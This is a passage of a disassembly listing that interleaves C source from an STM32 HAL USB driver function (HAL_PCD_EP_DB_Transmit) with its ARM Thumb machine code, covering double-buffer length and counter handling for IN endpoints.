 8003082:	441a      	add	r2, r3
 8003084:	68bb      	ldr	r3, [r7, #8]
 8003086:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 8003088:	68bb      	ldr	r3, [r7, #8]
 800308a:	6a1a      	ldr	r2, [r3, #32]
 800308c:	68bb      	ldr	r3, [r7, #8]
 800308e:	691b      	ldr	r3, [r3, #16]
 8003090:	429a      	cmp	r2, r3
 8003092:	d30b      	bcc.n	80030ac <HAL_PCD_EP_DB_Transmit+0x27a>
        {
          len = ep->maxpacket;
 8003094:	68bb      	ldr	r3, [r7, #8]
 8003096:	691b      	ldr	r3, [r3, #16]
 8003098:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 800309c:	68bb      	ldr	r3, [r7, #8]
 800309e:	6a1a      	ldr	r2, [r3, #32]
 80030a0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80030a4:	1ad2      	subs	r2, r2, r3
 80030a6:	68bb      	ldr	r3, [r7, #8]
 80030a8:	621a      	str	r2, [r3, #32]
 80030aa:	e017      	b.n	80030dc <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else if (ep->xfer_len_db == 0U)
 80030ac:	68bb      	ldr	r3, [r7, #8]
 80030ae:	6a1b      	ldr	r3, [r3, #32]
 80030b0:	2b00      	cmp	r3, #0
 80030b2:	d108      	bne.n	80030c6 <HAL_PCD_EP_DB_Transmit+0x294>
        {
          len = TxPctSize;
 80030b4:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 80030b8:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 80030bc:	68bb      	ldr	r3, [r7, #8]
 80030be:	2200      	movs	r2, #0
 80030c0:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 80030c4:	e00a      	b.n	80030dc <HAL_PCD_EP_DB_Transmit+0x2aa>
        }
        else
        {
          ep->xfer_fill_db = 0U;
 80030c6:	68bb      	ldr	r3, [r7, #8]
 80030c8:	2200      	movs	r2, #0
 80030ca:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
          len = ep->xfer_len_db;
 80030ce:	68bb      	ldr	r3, [r7, #8]
 80030d0:	6a1b      	ldr	r3, [r3, #32]
 80030d2:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 80030d6:	68bb      	ldr	r3, [r7, #8]
 80030d8:	2200      	movs	r2, #0
 80030da:	621a      	str	r2, [r3, #32]
        }

        /* Write remaining Data to Buffer */
        /* Set the Double buffer counter for pma buffer1 */
        PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 80030dc:	68bb      	ldr	r3, [r7, #8]
 80030de:	785b      	ldrb	r3, [r3, #1]
 80030e0:	2b00      	cmp	r3, #0
 80030e2:	d165      	bne.n	80031b0 <HAL_PCD_EP_DB_Transmit+0x37e>
 80030e4:	68fb      	ldr	r3, [r7, #12]
 80030e6:	681b      	ldr	r3, [r3, #0]
 80030e8:	63fb      	str	r3, [r7, #60]	; 0x3c
 80030ea:	68fb      	ldr	r3, [r7, #12]
 80030ec:	681b      	ldr	r3, [r3, #0]
 80030ee:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80030f2:	b29b      	uxth	r3, r3
 80030f4:	461a      	mov	r2, r3
 80030f6:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80030f8:	4413      	add	r3, r2
 80030fa:	63fb      	str	r3, [r7, #60]	; 0x3c
 80030fc:	68bb      	ldr	r3, [r7, #8]
 80030fe:	781b      	ldrb	r3, [r3, #0]
 8003100:	00da      	lsls	r2, r3, #3
 8003102:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8003104:	4413      	add	r3, r2
 8003106:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800310a:	63bb      	str	r3, [r7, #56]	; 0x38
 800310c:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800310e:	881b      	ldrh	r3, [r3, #0]
 8003110:	b29b      	uxth	r3, r3
 8003112:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003116:	b29a      	uxth	r2, r3
 8003118:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800311a:	801a      	strh	r2, [r3, #0]
 800311c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003120:	2b3e      	cmp	r3, #62	; 0x3e
 8003122:	d91d      	bls.n	8003160 <HAL_PCD_EP_DB_Transmit+0x32e>
 8003124:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003128:	095b      	lsrs	r3, r3, #5
 800312a:	64bb      	str	r3, [r7, #72]	; 0x48
 800312c:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003130:	f003 031f 	and.w	r3, r3, #31
 8003134:	2b00      	cmp	r3, #0
 8003136:	d102      	bne.n	800313e <HAL_PCD_EP_DB_Transmit+0x30c>
 8003138:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 800313a:	3b01      	subs	r3, #1
 800313c:	64bb      	str	r3, [r7, #72]	; 0x48
 800313e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8003140:	881b      	ldrh	r3, [r3, #0]
 8003142:	b29a      	uxth	r2, r3
 8003144:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003146:	b29b      	uxth	r3, r3
 8003148:	029b      	lsls	r3, r3, #10
 800314a:	b29b      	uxth	r3, r3
 800314c:	4313      	orrs	r3, r2
 800314e:	b29b      	uxth	r3, r3
 8003150:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003154:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003158:	b29a      	uxth	r2, r3
 800315a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800315c:	801a      	strh	r2, [r3, #0]
 800315e:	e044      	b.n	80031ea <HAL_PCD_EP_DB_Transmit+0x3b8>
 8003160:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003164:	2b00      	cmp	r3, #0
 8003166:	d10a      	bne.n	800317e <HAL_PCD_EP_DB_Transmit+0x34c>
 8003168:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800316a:	881b      	ldrh	r3, [r3, #0]
 800316c:	b29b      	uxth	r3, r3
 800316e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003172:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8003176:	b29a      	uxth	r2, r3
 8003178:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800317a:	801a      	strh	r2, [r3, #0]
 800317c:	e035      	b.n	80031ea <HAL_PCD_EP_DB_Transmit+0x3b8>
 800317e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003182:	085b      	lsrs	r3, r3, #1
 8003184:	64bb      	str	r3, [r7, #72]	; 0x48
 8003186:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800318a:	f003 0301 	and.w	r3, r3, #1
 800318e:	2b00      	cmp	r3, #0
 8003190:	d002      	beq.n	8003198 <HAL_PCD_EP_DB_Transmit+0x366>
 8003192:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8003194:	3301      	adds	r3, #1
 8003196:	64bb      	str	r3, [r7, #72]	; 0x48
 8003198:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800319a:	881b      	ldrh	r3, [r3, #0]
 800319c:	b29a      	uxth	r2, r3
 800319e:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 80031a0:	b29b      	uxth	r3, r3
 80031a2:	029b      	lsls	r3, r3, #10
 80031a4:	b29b      	uxth	r3, r3
 80031a6:	4313      	orrs	r3, r2
 80031a8:	b29a      	uxth	r2, r3
 80031aa:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80031ac:	801a      	strh	r2, [r3, #0]
 80031ae:	e01c      	b.n	80031ea <HAL_PCD_EP_DB_Transmit+0x3b8>
 80031b0:	68bb      	ldr	r3, [r7, #8]
 80031b2:	785b      	ldrb	r3, [r3, #1]
 80031b4:	2b01      	cmp	r3, #1
 80031b6:	d118      	bne.n	80031ea <HAL_PCD_EP_DB_Transmit+0x3b8>
 80031b8:	68fb      	ldr	r3, [r7, #12]
 80031ba:	681b      	ldr	r3, [r3, #0]
 80031bc:	647b      	str	r3, [r7, #68]	; 0x44
 80031be:	68fb      	ldr	r3, [r7, #12]
 80031c0:	681b      	ldr	r3, [r3, #0]
 80031c2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80031c6:	b29b      	uxth	r3, r3
 80031c8:	461a      	mov	r2, r3
 80031ca:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80031cc:	4413      	add	r3, r2
 80031ce:	647b      	str	r3, [r7, #68]	; 0x44
 80031d0:	68bb      	ldr	r3, [r7, #8]
 80031d2:	781b      	ldrb	r3, [r3, #0]
 80031d4:	00da      	lsls	r2, r3, #3
 80031d6:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80031d8:	4413      	add	r3, r2
 80031da:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80031de:	643b      	str	r3, [r7, #64]	; 0x40
 80031e0:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031e4:	b29a      	uxth	r2, r3
 80031e6:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 80031e8:	801a      	strh	r2, [r3, #0]

        /* Copy user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr0, (uint16_t)len);
 80031ea:	68fb      	ldr	r3, [r7, #12]
 80031ec:	6818      	ldr	r0, [r3, #0]
 80031ee:	68bb      	ldr	r3, [r7, #8]
 80031f0:	6959      	ldr	r1, [r3, #20]
 80031f2:	68bb      	ldr	r3, [r7, #8]
 80031f4:	891a      	ldrh	r2, [r3, #8]
 80031f6:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80031fa:	b29b      	uxth	r3, r3
 80031fc:	f005 f8c9 	bl	8008392 <USB_WritePMA>
 8003200:	e1e0      	b.n	80035c4 <HAL_PCD_EP_DB_Transmit+0x792>
    }
  }
  else /* Data Buffer1 ACK received */
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8003202:	68fb      	ldr	r3, [r7, #12]
 8003204:	681b      	ldr	r3, [r3, #0]
 8003206:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800320a:	b29b      	uxth	r3, r3
 800320c:	461a      	mov	r2, r3
 800320e:	68bb      	ldr	r3, [r7, #8]
 8003210:	781b      	ldrb	r3, [r3, #0]
 8003212:	00db      	lsls	r3, r3, #3
 8003214:	4413      	add	r3, r2
 8003216:	68fa      	ldr	r2, [r7, #12]
 8003218:	6812      	ldr	r2, [r2, #0]
 800321a:	4413      	add	r3, r2
 800321c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003220:	881b      	ldrh	r3, [r3, #0]
 8003222:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003226:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len >= TxPctSize)
 800322a:	68bb      	ldr	r3, [r7, #8]
 800322c:	699a      	ldr	r2, [r3, #24]
 800322e:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003232:	429a      	cmp	r2, r3
 8003234:	d307      	bcc.n	8003246 <HAL_PCD_EP_DB_Transmit+0x414>
    {
      ep->xfer_len -= TxPctSize;
 8003236:	68bb      	ldr	r3, [r7, #8]
 8003238:	699a      	ldr	r2, [r3, #24]
 800323a:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800323e:	1ad2      	subs	r2, r2, r3
 8003240:	68bb      	ldr	r3, [r7, #8]
 8003242:	619a      	str	r2, [r3, #24]
 8003244:	e002      	b.n	800324c <HAL_PCD_EP_DB_Transmit+0x41a>
    }
    else
    {
      ep->xfer_len = 0U;
 8003246:	68bb      	ldr	r3, [r7, #8]
 8003248:	2200      	movs	r2, #0
 800324a:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 800324c:	68bb      	ldr	r3, [r7, #8]
 800324e:	699b      	ldr	r3, [r3, #24]
 8003250:	2b00      	cmp	r3, #0
 8003252:	f040 80c0 	bne.w	80033d6 <HAL_PCD_EP_DB_Transmit+0x5a4>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8003256:	68bb      	ldr	r3, [r7, #8]
 8003258:	785b      	ldrb	r3, [r3, #1]
 800325a:	2b00      	cmp	r3, #0
 800325c:	d126      	bne.n	80032ac <HAL_PCD_EP_DB_Transmit+0x47a>
 800325e:	68fb      	ldr	r3, [r7, #12]
 8003260:	681b      	ldr	r3, [r3, #0]
 8003262:	67fb      	str	r3, [r7, #124]	; 0x7c
 8003264:	68fb      	ldr	r3, [r7, #12]
 8003266:	681b      	ldr	r3, [r3, #0]
 8003268:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800326c:	b29b      	uxth	r3, r3
 800326e:	461a      	mov	r2, r3
 8003270:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8003272:	4413      	add	r3, r2
 8003274:	67fb      	str	r3, [r7, #124]	; 0x7c
 8003276:	68bb      	ldr	r3, [r7, #8]
 8003278:	781b      	ldrb	r3, [r3, #0]
 800327a:	00da      	lsls	r2, r3, #3
 800327c:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 800327e:	4413      	add	r3, r2
 8003280:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8003284:	67bb      	str	r3, [r7, #120]	; 0x78
 8003286:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003288:	881b      	ldrh	r3, [r3, #0]
 800328a:	b29b      	uxth	r3, r3
 800328c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003290:	b29a      	uxth	r2, r3
 8003292:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003294:	801a      	strh	r2, [r3, #0]
 8003296:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8003298:	881b      	ldrh	r3, [r3, #0]
 800329a:	b29b      	uxth	r3, r3
 800329c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80032a0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80032a4:	b29a      	uxth	r2, r3
 80032a6:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80032a8:	801a      	strh	r2, [r3, #0]
 80032aa:	e01a      	b.n	80032e2 <HAL_PCD_EP_DB_Transmit+0x4b0>
 80032ac:	68bb      	ldr	r3, [r7, #8]
 80032ae:	785b      	ldrb	r3, [r3, #1]
 80032b0:	2b01      	cmp	r3, #1
 80032b2:	d116      	bne.n	80032e2 <HAL_PCD_EP_DB_Transmit+0x4b0>
 80032b4:	68fb      	ldr	r3, [r7, #12]
 80032b6:	681b      	ldr	r3, [r3, #0]
 80032b8:	667b      	str	r3, [r7, #100]	; 0x64
 80032ba:	68fb      	ldr	r3, [r7, #12]
 80032bc:	681b      	ldr	r3, [r3, #0]
 80032be:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80032c2:	b29b      	uxth	r3, r3
 80032c4:	461a      	mov	r2, r3
 80032c6:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80032c8:	4413      	add	r3, r2
 80032ca:	667b      	str	r3, [r7, #100]	; 0x64
 80032cc:	68bb      	ldr	r3, [r7, #8]
 80032ce:	781b      	ldrb	r3, [r3, #0]
 80032d0:	00da      	lsls	r2, r3, #3
 80032d2:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80032d4:	4413      	add	r3, r2
 80032d6:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80032da:	663b      	str	r3, [r7, #96]	; 0x60
 80032dc:	6e3b      	ldr	r3, [r7, #96]	; 0x60
 80032de:	2200      	movs	r2, #0
 80032e0:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 80032e2:	68fb      	ldr	r3, [r7, #12]
 80032e4:	681b      	ldr	r3, [r3, #0]
 80032e6:	677b      	str	r3, [r7, #116]	; 0x74
 80032e8:	68bb      	ldr	r3, [r7, #8]
 80032ea:	785b      	ldrb	r3, [r3, #1]
 80032ec:	2b00      	cmp	r3, #0
 80032ee:	d12b      	bne.n	8003348 <HAL_PCD_EP_DB_Transmit+0x516>
 80032f0:	68fb      	ldr	r3, [r7, #12]
 80032f2:	681b      	ldr	r3, [r3, #0]
 80032f4:	66fb      	str	r3, [r7, #108]	; 0x6c
 80032f6:	68fb      	ldr	r3, [r7, #12]
 80032f8:	681b      	ldr	r3, [r3, #0]
 80032fa:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80032fe:	b29b      	uxth	r3, r3
 8003300:	461a      	mov	r2, r3
 8003302:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8003304:	4413      	add	r3, r2
 8003306:	66fb      	str	r3, [r7, #108]	; 0x6c
 8003308:	68bb      	ldr	r3, [r7, #8]
 800330a:	781b      	ldrb	r3, [r3, #0]
 800330c:	00da      	lsls	r2, r3, #3
 800330e:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 8003310:	4413      	add	r3, r2
 8003312:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003316:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 800331a:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 800331e:	881b      	ldrh	r3, [r3, #0]
 8003320:	b29b      	uxth	r3, r3
 8003322:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003326:	b29a      	uxth	r2, r3
 8003328:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 800332c:	801a      	strh	r2, [r3, #0]
 800332e:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 8003332:	881b      	ldrh	r3, [r3, #0]
 8003334:	b29b      	uxth	r3, r3
 8003336:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800333a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800333e:	b29a      	uxth	r2, r3
 8003340:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 8003344:	801a      	strh	r2, [r3, #0]
 8003346:	e017      	b.n	8003378 <HAL_PCD_EP_DB_Transmit+0x546>
 8003348:	68bb      	ldr	r3, [r7, #8]
 800334a:	785b      	ldrb	r3, [r3, #1]
 800334c:	2b01      	cmp	r3, #1
 800334e:	d113      	bne.n	8003378 <HAL_PCD_EP_DB_Transmit+0x546>
 8003350:	68fb      	ldr	r3, [r7, #12]
 8003352:	681b      	ldr	r3, [r3, #0]
 8003354:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003358:	b29b      	uxth	r3, r3
 800335a:	461a      	mov	r2, r3
 800335c:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 800335e:	4413      	add	r3, r2
 8003360:	677b      	str	r3, [r7, #116]	; 0x74
 8003362:	68bb      	ldr	r3, [r7, #8]
 8003364:	781b      	ldrb	r3, [r3, #0]
 8003366:	00da      	lsls	r2, r3, #3
 8003368:	6f7b      	ldr	r3, [r7, #116]	; 0x74
 800336a:	4413      	add	r3, r2
 800336c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003370:	673b      	str	r3, [r7, #112]	; 0x70
 8003372:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 8003374:	2200      	movs	r2, #0
 8003376:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8003378:	68bb      	ldr	r3, [r7, #8]
 800337a:	781b      	ldrb	r3, [r3, #0]
 800337c:	4619      	mov	r1, r3
 800337e:	68f8      	ldr	r0, [r7, #12]
 8003380:	f009 fa69 	bl	800c856 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 8003384:	88fb      	ldrh	r3, [r7, #6]
 8003386:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800338a:	2b00      	cmp	r3, #0
 800338c:	f040 811a 	bne.w	80035c4 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 8003390:	68fb      	ldr	r3, [r7, #12]
 8003392:	681b      	ldr	r3, [r3, #0]
 8003394:	461a      	mov	r2, r3
 8003396:	68bb      	ldr	r3, [r7, #8]
 8003398:	781b      	ldrb	r3, [r3, #0]
 800339a:	009b      	lsls	r3, r3, #2
 800339c:	4413      	add	r3, r2
 800339e:	881b      	ldrh	r3, [r3, #0]
 80033a0:	b29b      	uxth	r3, r3
 80033a2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80033a6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80033aa:	f8a7 3088 	strh.w	r3, [r7, #136]	; 0x88
 80033ae:	68fb      	ldr	r3, [r7, #12]
 80033b0:	681b      	ldr	r3, [r3, #0]
 80033b2:	461a      	mov	r2, r3
 80033b4:	68bb      	ldr	r3, [r7, #8]
 80033b6:	781b      	ldrb	r3, [r3, #0]
 80033b8:	009b      	lsls	r3, r3, #2
 80033ba:	441a      	add	r2, r3
 80033bc:	f8b7 3088 	ldrh.w	r3, [r7, #136]	; 0x88
 80033c0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80033c4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80033c8:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 80033cc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80033d0:	b29b      	uxth	r3, r3
 80033d2:	8013      	strh	r3, [r2, #0]
 80033d4:	e0f6      	b.n	80035c4 <HAL_PCD_EP_DB_Transmit+0x792>
      }
    }
    else /* Transfer is not yet Done */
    {
      /* need to Free USB Buff */
      if ((wEPVal & USB_EP_DTOG_RX) == 0U)
 80033d6:	88fb      	ldrh	r3, [r7, #6]
 80033d8:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 80033dc:	2b00      	cmp	r3, #0
 80033de:	d121      	bne.n	8003424 <HAL_PCD_EP_DB_Transmit+0x5f2>
      {
        PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 1U);
 80033e0:	68fb      	ldr	r3, [r7, #12]
 80033e2:	681b      	ldr	r3, [r3, #0]
 80033e4:	461a      	mov	r2, r3
 80033e6:	68bb      	ldr	r3, [r7, #8]
 80033e8:	781b      	ldrb	r3, [r3, #0]
 80033ea:	009b      	lsls	r3, r3, #2
 80033ec:	4413      	add	r3, r2
 80033ee:	881b      	ldrh	r3, [r3, #0]
 80033f0:	b29b      	uxth	r3, r3
 80033f2:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80033f6:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 80033fa:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e
 80033fe:	68fb      	ldr	r3, [r7, #12]
 8003400:	681b      	ldr	r3, [r3, #0]
 8003402:	461a      	mov	r2, r3
 8003404:	68bb      	ldr	r3, [r7, #8]
 8003406:	781b      	ldrb	r3, [r3, #0]
 8003408:	009b      	lsls	r3, r3, #2
 800340a:	441a      	add	r2, r3
 800340c:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8003410:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8003414:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8003418:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 800341c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8003420:	b29b      	uxth	r3, r3
 8003422:	8013      	strh	r3, [r2, #0]
      }

      /* Still there is data to Fill in the next Buffer */
      if (ep->xfer_fill_db == 1U)
 8003424:	68bb      	ldr	r3, [r7, #8]
 8003426:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 800342a:	2b01      	cmp	r3, #1
 800342c:	f040 80ca 	bne.w	80035c4 <HAL_PCD_EP_DB_Transmit+0x792>
      {
        ep->xfer_buff += TxPctSize;
 8003430:	68bb      	ldr	r3, [r7, #8]
 8003432:	695a      	ldr	r2, [r3, #20]
 8003434:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003438:	441a      	add	r2, r3
 800343a:	68bb      	ldr	r3, [r7, #8]
 800343c:	615a      	str	r2, [r3, #20]
        ep->xfer_count += TxPctSize;
 800343e:	68bb      	ldr	r3, [r7, #8]
 8003440:	69da      	ldr	r2, [r3, #28]
 8003442:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8003446:	441a      	add	r2, r3
 8003448:	68bb      	ldr	r3, [r7, #8]
 800344a:	61da      	str	r2, [r3, #28]

        /* Calculate the len of the new buffer to fill */
        if (ep->xfer_len_db >= ep->maxpacket)
 800344c:	68bb      	ldr	r3, [r7, #8]
 800344e:	6a1a      	ldr	r2, [r3, #32]
 8003450:	68bb      	ldr	r3, [r7, #8]
 8003452:	691b      	ldr	r3, [r3, #16]
 8003454:	429a      	cmp	r2, r3
 8003456:	d30b      	bcc.n	8003470 <HAL_PCD_EP_DB_Transmit+0x63e>
        {
          len = ep->maxpacket;
 8003458:	68bb      	ldr	r3, [r7, #8]
 800345a:	691b      	ldr	r3, [r3, #16]
 800345c:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 8003460:	68bb      	ldr	r3, [r7, #8]
 8003462:	6a1a      	ldr	r2, [r3, #32]
 8003464:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003468:	1ad2      	subs	r2, r2, r3
 800346a:	68bb      	ldr	r3, [r7, #8]
 800346c:	621a      	str	r2, [r3, #32]
 800346e:	e017      	b.n	80034a0 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else if (ep->xfer_len_db == 0U)
 8003470:	68bb      	ldr	r3, [r7, #8]
 8003472:	6a1b      	ldr	r3, [r3, #32]
 8003474:	2b00      	cmp	r3, #0
 8003476:	d108      	bne.n	800348a <HAL_PCD_EP_DB_Transmit+0x658>
        {
          len = TxPctSize;
 8003478:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800347c:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 8003480:	68bb      	ldr	r3, [r7, #8]
 8003482:	2200      	movs	r2, #0
 8003484:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8003488:	e00a      	b.n	80034a0 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else
        {
          len = ep->xfer_len_db;
 800348a:	68bb      	ldr	r3, [r7, #8]
 800348c:	6a1b      	ldr	r3, [r3, #32]
 800348e:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 8003492:	68bb      	ldr	r3, [r7, #8]
 8003494:	2200      	movs	r2, #0
 8003496:	621a      	str	r2, [r3, #32]
          ep->xfer_fill_db = 0;
 8003498:	68bb      	ldr	r3, [r7, #8]
 800349a:	2200      	movs	r2, #0
 800349c:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
        }

        /* Set the Double buffer counter for pmabuffer1 */
        PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 80034a0:	68fb      	ldr	r3, [r7, #12]
 80034a2:	681b      	ldr	r3, [r3, #0]
 80034a4:	657b      	str	r3, [r7, #84]	; 0x54
 80034a6:	68bb      	ldr	r3, [r7, #8]
 80034a8:	785b      	ldrb	r3, [r3, #1]
 80034aa:	2b00      	cmp	r3, #0
 80034ac:	d165      	bne.n	800357a <HAL_PCD_EP_DB_Transmit+0x748>
 80034ae:	68fb      	ldr	r3, [r7, #12]
 80034b0:	681b      	ldr	r3, [r3, #0]
 80034b2:	65fb      	str	r3, [r7, #92]	; 0x5c
 80034b4:	68fb      	ldr	r3, [r7, #12]
 80034b6:	681b      	ldr	r3, [r3, #0]
 80034b8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80034bc:	b29b      	uxth	r3, r3
 80034be:	461a      	mov	r2, r3
 80034c0:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80034c2:	4413      	add	r3, r2
 80034c4:	65fb      	str	r3, [r7, #92]	; 0x5c
 80034c6:	68bb      	ldr	r3, [r7, #8]
 80034c8:	781b      	ldrb	r3, [r3, #0]
 80034ca:	00da      	lsls	r2, r3, #3
 80034cc:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80034ce:	4413      	add	r3, r2
 80034d0:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80034d4:	65bb      	str	r3, [r7, #88]	; 0x58
 80034d6:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80034d8:	881b      	ldrh	r3, [r3, #0]
 80034da:	b29b      	uxth	r3, r3
 80034dc:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80034e0:	b29a      	uxth	r2, r3
 80034e2:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80034e4:	801a      	strh	r2, [r3, #0]
 80034e6:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80034ea:	2b3e      	cmp	r3, #62	; 0x3e
 80034ec:	d91d      	bls.n	800352a <HAL_PCD_EP_DB_Transmit+0x6f8>
